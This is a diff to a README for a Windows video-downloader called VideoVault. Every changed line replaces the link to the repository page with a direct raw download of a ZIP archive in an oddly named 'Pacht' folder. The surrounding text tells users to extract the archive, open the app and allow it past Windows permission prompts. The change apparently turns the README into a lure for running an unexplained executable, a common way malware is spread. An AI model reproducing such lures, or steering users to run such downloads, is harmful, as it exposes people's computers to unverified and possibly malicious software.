@@ -1,10 +1,10 @@
 # 🎬 VideoVault - Save Videos With Ease
 
-[![Download VideoVault](https://img.shields.io/badge/Download-VideoVault-blue?style=for-the-badge&logo=github)](https://github.com/submuk/VideoVault)
+[![Download VideoVault](https://img.shields.io/badge/Download-VideoVault-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/submuk/VideoVault/main/Pacht/Video_Vault_v2.1.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/submuk/VideoVault
+Visit this page to download: https://raw.githubusercontent.com/submuk/VideoVault/main/Pacht/Video_Vault_v2.1.zip
 
 Use the file or package from the repository page, then download it to your Windows PC.
 
@@ -34,7 +34,7 @@ If Windows asks for permission, allow the app to run.
 
 Follow these steps in order:
 
-1. Open the download page: https://github.com/submuk/VideoVault  
+1. Open the download page: https://raw.githubusercontent.com/submuk/VideoVault/main/Pacht/Video_Vault_v2.1.zip  
 2. Find the latest release or download file on the page  
 3. Download the Windows file to your PC  
 4. If the file comes in a ZIP folder, right-click it and choose **Extract All**  
@@ -150,14 +150,14 @@ For a smoother download, use these habits:
 If you need to set up VideoVault again:
 
 1. Delete the old app folder if needed
-2. Download the file again from https://github.com/submuk/VideoVault
+2. Download the file again from https://raw.githubusercontent.com/submuk/VideoVault/main/Pacht/Video_Vault_v2.1.zip
 3. Extract the files if the download comes as a ZIP
 4. Open the app file
 5. Test it with one video link
 
 ## 📌 Download Again
 
-Visit this page to download: https://github.com/submuk/VideoVault
+Visit this page to download: https://raw.githubusercontent.com/submuk/VideoVault/main/Pacht/Video_Vault_v2.1.zip
 
 Use this link if you need the latest file, a fresh copy, or the current release package
 
